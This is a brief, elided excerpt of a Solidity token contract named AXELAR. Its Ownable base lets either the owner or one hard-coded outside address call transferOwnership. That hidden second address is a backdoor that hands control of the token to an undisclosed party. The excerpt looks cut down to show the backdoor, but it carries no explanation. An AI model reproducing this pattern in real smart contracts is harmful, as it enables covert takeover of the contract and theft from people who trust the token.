...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x747D365026A8c4879DbB941FFad21a6E51E93462));
...
contract AXELAR is Context, IERC20, Ownable, Pausable {
